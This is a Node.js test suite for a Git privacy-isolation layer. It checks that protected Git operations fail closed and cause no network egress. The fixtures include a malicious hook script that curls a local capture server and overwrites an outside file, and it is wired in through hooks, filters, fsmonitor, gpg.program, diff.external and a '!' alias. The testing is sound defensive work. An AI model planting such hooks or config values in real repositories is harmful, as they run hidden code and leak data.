// SPDX-License-Identifier: EUPL-1.2
'use strict';
const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs/promises');
const path = require('node:path');
const os = require('node:os');
const http = require('node:http');
const { GitVersions, run, registerGitPrivacyResolver, metadataOnly } = require('../core/git.cjs');
const { runIsolatedGit, runtimePaths } = require('../core/privacy/git-isolation.cjs');
const { Checkpoints } = require('../core/checkpoints.cjs');
const { Restoration } = require('../core/restoration.cjs');
const { Store } = require('../core/store.cjs');
const enabled = process.platform === 'darwin' && process.env.AURA_PRIVACY_NATIVE === '1';
const native = { skip: enabled ? false : 'Set AURA_PRIVACY_NATIVE=1 on a qualified macOS host.', timeout: 180000 };

test('host Git never accepts asynchronous or stale isolation guards', async () => {
  await assert.rejects(runIsolatedGit('/unused', ['status'], undefined, [], { assertCurrent: async () => true }), { code: 'PRIVACY_STALE' });
  await assert.rejects(runIsolatedGit('/unused', ['status'], undefined, [], { assertCurrent: () => false }), { code: 'PRIVACY_STALE' });
  await assert.rejects(runIsolatedGit('/unused', ['status'], undefined, [['core.hooksPath', '/unsafe']], { assertCurrent: () => true }));
});
test('all direct Git imports consult host permits before spawning', async () => {
  const release = registerGitPrivacyResolver(() => ({ protected: true, assertCurrent: () => false }));
  try { assert.throws(() => run('/unused', ['status']), /scope changed/); }
  finally { release(); }
});
test('only explicit metadata operations can avoid the legacy process-risk record', () => {
  for (const args of [['--version'],['init','-b','main'],['config','user.name'],['rev-parse','--show-toplevel'],['symbolic-ref','--short','HEAD'],['check-ignore','--stdin','-z']]) assert.equal(metadataOnly(args, []), true, args.join(' '));
  for (const args of [['status'],['add'],['commit'],['push'],['show'],['diff-tree'],['log'],['log','--ext-diff'],['cat-file','--filters'],['cat-file','blob','hash'],['ls-tree','HEAD'],['rev-list','HEAD'],['merge-base','HEAD','branch'],['for-each-ref'],['rev-parse','--verify','HEAD^{tree}'],['symbolic-ref','HEAD','refs/heads/new'],['config','--edit'],['config','edit'],['-c','alias.attack=!bad','attack']]) assert.equal(metadataOnly(args, []), false, args.join(' '));
  assert.equal(metadataOnly(['log'], [['http.extraHeader', 'test']]), false);
});
test('a retired workbench cannot consult its missing profile for unrelated Git roots', async t => {
  const { Workbench } = require('../core/workbench.cjs');
  const root = await fs.mkdtemp(path.join(await fs.realpath(os.tmpdir()), 'aura-git-owner-'));
  t.after(() => fs.rm(root, { recursive: true, force: true }));
  const project = path.join(root, 'old-project'), other = path.join(root, 'other-project'), profile = path.join(root, 'profile');
  await fs.mkdir(project); await fs.mkdir(other);
  const bench = new Workbench({ directory: profile, safeStorage: {}, emit() {}, library: async () => ({ skills: [], features: [] }) });
  t.after(() => bench.releaseGitPrivacy()); bench.project = { root: project };
  await bench.store.saveProject(project, { privacy: { enabled: true, version: 'protected', defaultClass: 'strict', workMode: 'local' } });
  await fs.rm(profile, { recursive: true, force: true });
  assert.match((await run(other, ['--version'])).toString(), /^git version/);
  // Its own project cannot silently become legacy just because configuration
  // vanished. Organization policy loss is an integrity failure, not opt-out.
  assert.throws(() => run(project, ['--version']), /Privacy Gate|kontrol|grundlag/i);
});
async function fixture(t) {
  const root = await fs.mkdtemp(path.join(await fs.realpath(os.tmpdir()), 'aura-private-git-test-'));
  const project = path.join(root, 'project'), outside = path.join(root, 'unrelated.txt');
  await fs.mkdir(project, { mode: 0o755 }); await fs.writeFile(outside, 'SYNTHETIC_UNRELATED_DATA');
  t.after(() => fs.rm(root, { recursive: true, force: true }));
  const git = new GitVersions();
  await run(project, ['init', '-b', 'main']);
  await run(project, ['config', '--local', 'user.name', 'Synthetic Git fixture']);
  await run(project, ['config', '--local', 'user.email', 'fixture@example.invalid']);
  return { root, project, outside, git };
}
test('a completed legacy Git hook with a live detached child blocks later product privacy activation', { skip: process.platform === 'win32' }, async t => {
  const { Workbench } = require('../core/workbench.cjs');
  const f = await fixture(t), profile = path.join(f.root, 'profile');
  const bench = new Workbench({ directory: profile, safeStorage: { isEncryptionAvailable: () => false }, emit() {}, library: async () => ({ skills: [], features: [] }) });
  t.after(() => bench.releaseGitPrivacy()); bench.project = { root: f.project };
  await bench.store.saveProject(f.project, { privacy: { enabled: false, version: 'legacy' } });
  const pidFile = path.join(f.root, 'owned-child.pid'); let pid;
  t.after(() => { if (pid) try { process.kill(pid, 'SIGTERM'); } catch {} });
  await fs.writeFile(path.join(f.project, '.git/hooks/pre-commit'), `#!/bin/sh\n/bin/sleep 30 </dev/null >/dev/null 2>&1 &\necho $! > '${pidFile}'\n`, { mode: 0o755 });
  await fs.writeFile(path.join(f.project, 'public.txt'), 'Reviewed synthetic data');
  await bench.git.saveAll(f.project, 'Legacy hook fixture');
  pid = Number((await fs.readFile(pidFile, 'utf8')).trim()); assert.ok(Number.isSafeInteger(pid) && pid > 1); process.kill(pid, 0);
  await assert.rejects(bench.privacy.configure({ scope: 'project', settings: { enabled: true, workMode: 'cloud-controlled', defaultClass: 'public', requireApproval: false } }), { code: 'PRIVACY_PREVIOUS_RUNTIME_UNCONTAINED' });
  assert.equal((await bench.store.project(f.project)).privacy.enabled, false); process.kill(pid, 0);
  const reactivated = new Workbench({ store: bench.store, emit() {}, library: async () => ({ skills: [], features: [] }) });
  t.after(() => reactivated.releaseGitPrivacy()); reactivated.project = { root: f.project };
  await assert.rejects(reactivated.privacy.configure({ scope: 'project', settings: { enabled: true, workMode: 'cloud-controlled', defaultClass: 'public', requireApproval: false } }), { code: 'PRIVACY_PREVIOUS_RUNTIME_UNCONTAINED' });
});
test('native fresh host-owned project bootstrap can enable privacy before any uncontained execution', native, async t => {
  const { Workbench } = require('../core/workbench.cjs');
  const root = await fs.mkdtemp(path.join(await fs.realpath(os.tmpdir()), 'aura-fresh-git-'));
  t.after(() => fs.rm(root, { recursive: true, force: true }));
  const project = path.join(root, 'project'); await fs.mkdir(project); await fs.writeFile(path.join(project, 'readme.txt'), 'Fresh synthetic project');
  const bench = new Workbench({ directory: path.join(root, 'profile'), safeStorage: { isEncryptionAvailable: () => false }, emit() {}, library: async () => ({ skills: [], features: [] }) });
  t.after(() => bench.releaseGitPrivacy()); await bench.store.saveProject(project, { privacy: { enabled: false, version: 'fresh' } });
  const created = await bench.withGitPrivacyRoot(project, () => bench.git.startProject(project)); assert.equal(created.started, true); assert.equal(bench.gitPrivacyRoots.size, 0);
  // Main switches to a new registry workbench after creation; history.js then
  // automatically requests Git status before the user can enable data control.
  const active = new Workbench({ store: bench.store, emit() {}, library: async () => ({ skills: [], features: [] }) });
  t.after(() => active.releaseGitPrivacy()); active.project = { root: project };
  assert.equal((await active.git.status(project)).initialized, true);
  assert.equal(active.privacyActivationGuard.activation(project)(), true);
  await active.privacy.configure({ scope: 'project', settings: { enabled: true, workMode: 'cloud-controlled', defaultClass: 'public', requireApproval: false } });
  assert.equal((await bench.store.project(project)).privacy.enabled, true);
  assert.throws(() => active.releaseFreshGitForPublishing(project, () => true), { code: 'PRIVACY_EXTERNAL_ADAPTER_REQUIRED' });
  // Replacing repository metadata cannot downgrade a qualified scope to legacy.
  await fs.rename(path.join(project, '.git'), path.join(project, '.git-original'));
  await fs.mkdir(path.join(project, '.git'));
  assert.throws(() => run(project, ['status']), { code: 'PRIVACY_GIT_ISOLATION_REQUIRED' });
});
test('native fresh project preserves deliberate privacy-off publishing without erasing its activation barrier', native, async t => {
  const { Workbench } = require('../core/workbench.cjs');
  const root = await fs.mkdtemp(path.join(await fs.realpath(os.tmpdir()), 'aura-fresh-git-publish-'));
  t.after(() => fs.rm(root, { recursive: true, force: true }));
  const project = path.join(root, 'project'); await fs.mkdir(project); await fs.writeFile(path.join(project, 'readme.txt'), 'Fresh synthetic project');
  const bench = new Workbench({ directory: path.join(root, 'profile'), safeStorage: { isEncryptionAvailable: () => false }, emit() {}, library: async () => ({ skills: [], features: [] }) });
  t.after(() => bench.releaseGitPrivacy()); await bench.store.saveProject(project, { privacy: { enabled: false, version: 'fresh' } });
  await bench.withGitPrivacyRoot(project, () => bench.git.startProject(project)); bench.project = { root: project };
  await new (require('../core/publishing.cjs').GitTransport)({}, { getPrivacy: () => bench.privacy }).guard(project);
  assert.throws(() => bench.releaseFreshGitForPublishing(project, async () => true), { code: 'PRIVACY_STALE' });
  assert.equal(bench.gitSession.freshRoots.has(project), true);
  const egress = new (require('../core/privacy/external-egress.cjs').ExternalEgress)(() => bench.privacy);
  const stale = await egress.legacyPermit(project);
  await bench.store.saveProject(project, { privacy: { enabled: false, version: 'changed', conversations: { protectedChat: { enabled: true, version: 'chat', defaultClass: 'strict' } } } });
  assert.throws(() => bench.releaseFreshGitForPublishing(project, stale), { code: 'PRIVACY_STALE' });
  assert.throws(() => bench.releaseFreshGitForPublishing(project, () => true), { code: 'PRIVACY_EXTERNAL_ADAPTER_REQUIRED' });
  assert.equal(bench.gitSession.freshRoots.has(project), true);
  await bench.store.saveProject(project, { privacy: { enabled: false, version: 'fresh-again' } });
  assert.equal(bench.releaseFreshGitForPublishing(project, () => true), true);
  assert.equal(bench.gitSession.freshRoots.has(project), false);
  assert.match((await run(project, ['--version'], undefined, [['http.followRedirects','false']])).toString(), /^git version/);
  await assert.rejects(bench.privacy.configure({ scope: 'project', settings: { enabled: true, workMode: 'cloud-controlled', defaultClass: 'public', requireApproval: false } }), { code: 'PRIVACY_PREVIOUS_RUNTIME_UNCONTAINED' });
});
test('host publishing release cannot override an encrypted historical floor in another conversation', async t => {
  const { Workbench } = require('../core/workbench.cjs');
  const root = await fs.mkdtemp(path.join(await fs.realpath(os.tmpdir()), 'aura-git-floor-'));
  t.after(() => fs.rm(root, { recursive: true, force: true }));
  const project = path.join(root, 'project'); await fs.mkdir(project);
  const bench = new Workbench({ directory: path.join(root, 'profile'), safeStorage: { isEncryptionAvailable: () => true, encryptString: value => Buffer.from(value), decryptString: value => value.toString() }, emit() {}, library: async () => ({ skills: [], features: [] }) });
  t.after(() => bench.releaseGitPrivacy()); bench.project = { root: project };
  await bench.store.saveProject(project, { privacy: { enabled: true, version: 'prior', workMode: 'local', defaultClass: 'strict' } });
  await bench.privacy.ensureDataFloor({ kind: 'conversation', root: project, chat: 'protected-prior-chat' }, [{ classification: 'strict' }]);
  await bench.store.saveProject(project, { privacy: { enabled: false, version: 'disabled' } });
  assert.throws(() => bench.releaseFreshGitForPublishing(project, () => true), { code: 'PRIVACY_EXTERNAL_ADAPTER_REQUIRED' });
});
test('native protected Git neutralizes malicious hooks, filters, signer and fsmonitor with zero egress', native, async t => {
  const f = await fixture(t), requests = [];
  const server = http.createServer((req, res) => { requests.push(req.url); res.end('unexpected'); });
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  t.after(async () => { server.closeAllConnections(); await new Promise(resolve => server.close(resolve)); });
  const endpoint = `http://127.0.0.1:${server.address().port}/capture`;
  const malicious = path.join(f.project, 'malicious-hook');
  await fs.writeFile(malicious, `#!/bin/sh\n/usr/bin/curl -s '${endpoint}'\nprintf changed > '${f.outside}'\nprintf invoked >> '${f.project}/invoked.txt'\ncat\n`, { mode: 0o755 });
  await fs.copyFile(malicious, path.join(f.project, '.git/hooks/pre-commit')); await fs.chmod(path.join(f.project, '.git/hooks/pre-commit'), 0o755);
  for (const [key, value] of [['filter.attack.clean', malicious], ['filter.attack.smudge', malicious], ['filter.attack.process', malicious], ['filter.attack.required', 'true'], ['core.fsmonitor', malicious], ['commit.gpgsign', 'true'], ['gpg.program', malicious], ['diff.external', malicious]]) await run(f.project, ['config', '--local', key, value]);
  await fs.writeFile(path.join(f.project, '.gitattributes'), '*.txt filter=attack diff=attack\n');
  await fs.writeFile(path.join(f.project, 'result.txt'), 'Reviewed public result');
  const release = registerGitPrivacyResolver(root => root === f.project ? { protected: true, assertCurrent: () => true } : null); t.after(release);
  const status = await f.git.status(f.project); assert.equal(status.initialized, true);
  const review = await f.git.review(f.project);
  const saved = await f.git.commit(f.project, { token: review.token, files: ['result.txt'], message: 'Approved protected version' });
  assert.match(saved.head, /^[a-f0-9]{40,64}$/);
  assert.equal((await run(f.project, ['show', saved.head + ':result.txt'])).toString(), 'Reviewed public result');
  assert.equal(await fs.readFile(f.outside, 'utf8'), 'SYNTHETIC_UNRELATED_DATA');
  await assert.rejects(fs.stat(path.join(f.project, 'invoked.txt')), { code: 'ENOENT' }); assert.equal(requests.length, 0);
  // Even an explicit host-side attempt to re-enable a shell driver remains in
  // the zero-network/file-limited scope. A model cannot supply these arguments.
  await assert.rejects(run(f.project, ['-c', 'alias.attack=!' + malicious, 'attack']));
  assert.equal(requests.length, 0); assert.equal(await fs.readFile(f.outside, 'utf8'), 'SYNTHETIC_UNRELATED_DATA');
});
test('native protected versions preserve automatic checkpoints and reviewed restoration', native, async t => {
  const f = await fixture(t), release = registerGitPrivacyResolver(root => root === f.project ? { protected: true, assertCurrent: () => true } : null); t.after(release);
  const file = path.join(f.project, 'public.txt'); await fs.writeFile(file, 'First version');
  await f.git.saveAll(f.project, 'Initial version'); const first = (await f.git.status(f.project)).head;
  const events = [], checkpoints = new Checkpoints(f.git, event => events.push(event));
  await checkpoints.begin(f.project, true, 'Approved file update'); await fs.writeFile(file, 'Updated by approved task'); await checkpoints.finish();
  assert.equal(events.at(-1).status, 'saved'); assert.notEqual(events.at(-1).head, first);
  const restoration = new Restoration(f.git, new Store(path.join(f.root, 'profile'), {}));
  const review = await restoration.review(f.project, { commit: first });
  await restoration.apply(f.project, review.token, {});
  assert.equal(await fs.readFile(file, 'utf8'), 'First version');
  assert.equal((await f.git.status(f.project)).history.length, 2, 'Restoration does not rewrite Git history.');
});
test('native protected Git fails closed for external worktree metadata and unauthorized config files', native, async t => {
  const f = await fixture(t); await fs.writeFile(path.join(f.project, 'readme'), 'Synthetic'); await f.git.saveAll(f.project, 'Initial');
  const worktree = path.join(f.root, 'worktree'); await run(f.project, ['worktree', 'add', '-b', 'test-copy', worktree]);
  await assert.rejects(runIsolatedGit(worktree, ['status'], undefined, [], { assertCurrent: () => true }), { code: 'PRIVACY_GIT_ISOLATION_REQUIRED' });
  const config = path.join(f.root, 'private-config'); await fs.writeFile(config, '[user]\nname = PRIVATE_EXTERNAL_CONFIG\n');
  await run(f.project, ['config', '--local', 'include.path', config]);
  await assert.rejects(runIsolatedGit(f.project, ['config', '--get', 'user.name'], undefined, [], { assertCurrent: () => true }));
  assert.equal(await fs.readFile(f.outside, 'utf8'), 'SYNTHETIC_UNRELATED_DATA');
});
